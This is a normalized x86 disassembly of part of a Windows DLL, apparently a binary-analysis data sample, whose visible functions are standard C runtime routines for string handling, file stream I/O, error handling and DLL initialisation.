jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10016788
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_10013890
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_10017034
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_100103ae
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10016c49
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10016c23
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_100166ee
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_10016788
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_10016788
push eax
push [ esi + 0x8 ]
call sub_10017080
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_1001040e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10016c49
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_10016c23
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10016788
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_1001390f
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_10017034
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_10010520
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_10016c49
mov esi [ eax + 0x8 ]
call sub_10016c23
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_1001003f
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_10016c07
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_100167f3
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_100105bd
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
movzx eax si
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp si cx
je r-xdata
pop esi
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
test edx edx
jne r-xdata
push [ ecx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
push 0x0
call sub_100173e5
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
mov edi 0x100
cmp si di
pop edi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ esi - 0x61 ]
cmp cx 0x19
ja r-xdata
add esi 0xffffffe0
movzx eax si
jmp r-xdata
sub_1001062a
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
movzx eax di
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp di cx
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov ecx 0x100
test esi esi
jne r-xdata
push [ edx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push ecx
push esi
push 0x0
call sub_100173e5
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push ebx
mov ebx ecx
cmp di bx
pop ebx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea ecx [ edi - 0x41 ]
cmp cx 0x19
ja r-xdata
add edi 0x20
movzx eax di
jmp r-xdata
sub_10010697
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
call sub_1001743c
movsx ecx [ ebp + 0xc ]
add esp 0x1c
neg eax
sbb eax eax
and eax ecx
pop ebp
retn
sub_100106c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
push [ eax + 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
push 0x0
call sub_1001743c
mov eax [ ebp + 0xc ]
add esp 0x1c
pop ebp
retn
sub_100106fe
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
pop ebp
jmp sub_1001431d
sub_10010798
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10017580
add esp 0xc
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10010806
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_10010990
mov esi eax
inc esi
push esi
call sub_1001338e
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_100178e5
add esp 0xc
jmp r-xdata
sub_10010876
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10010990
mov edi eax
inc edi
push edi
call sub_1001338e
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_100178e5
add esp 0xc
jmp r-xdata
sub_100108f6
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10010806
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001093c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100108d3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1001095d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100108d3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10010990
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10010a1b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10010a44
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_10011a90
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_1001794d
pop ecx
sub_10010b6c
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_100179d0
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_1001794d
pop ecx
pop ebp
jmp sub_10010a44
pop ebp
jmp eax
sub_10010bad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_10011a90
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10017080
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10010c3a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10010c2a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10010c5b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_10013730
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_10010c96
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001338e
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10017fdf
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_10002467
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10013de1
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_10010c7b
push sub_100286a8
call sub_1001457c
pop ecx
sub_10010cfb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_1001875f
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10017dd3
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10017a4b
push 0x214
push 0x1
call sub_100166ee
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_10018713
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_100185dc
mov [ rw-data ] eax
call sub_10018007
test eax eax
jge r-xdata
call sub_1001878f
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_10017d65
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10013d84
call sub_10018521
test eax eax
jl r-xdata
call sub_10017a7f
jmp r-xdata
push esi
call sub_10011c31
pop ecx
jmp r-xdata
push edi
push esi
call sub_10017abc
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_1001825b
call sub_10017a7f
call sub_1001878f
jmp r-xdata
call sub_1001825b
jmp r-xdata
call sub_100182a9
test eax eax
jl r-xdata
push 0x0
call sub_10013ba7
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10010e30
push 0xc
push r--data
call sub_10018984
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001697
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10010cfb
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10010cfb
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001697
push edi
push 0x0
push ebx
call sub_10010cfb
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_100189c9
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_10010e30
pop ecx
pop ebp
retn 0xc
call sub_10018b6c
sub_10010f49
push [ rw-data ]
call sub_100179d0
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_10018c02
push 0x1
push 0x0
call sub_10014434
add esp 0xc
jmp sub_1001431d
call eax
sub_10010f73
push 0xc
push r--data
call sub_10018984
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_100190d8
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_100189c9
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011077
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10018f74
pop ecx
pop ecx
mov ecx [ esi ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
inc [ esi ]
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_1001107f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_10018f74
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_1001178a
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_100190d8
pop ecx
push eax
call sub_1001983d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_10017080
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_100111e1
push 0xc
push r--data
call sub_10018984
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001107f
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011259
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
call sub_100189c9
retn
sub_10011263
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_100190d8
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_100167f3
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_10019919
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_10011354
push 0xc
push r--data
call sub_10018984
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011263
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100113bc
mov eax [ ebp - 0x1c ]
call sub_100167f3
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_100189c9
retn
sub_100113c6
push 0xc
push r--data
call sub_10018984
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_100190d8
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_100189c9
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100114c2
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_10019962
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_100114ca
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1001178a
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_10019bde
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
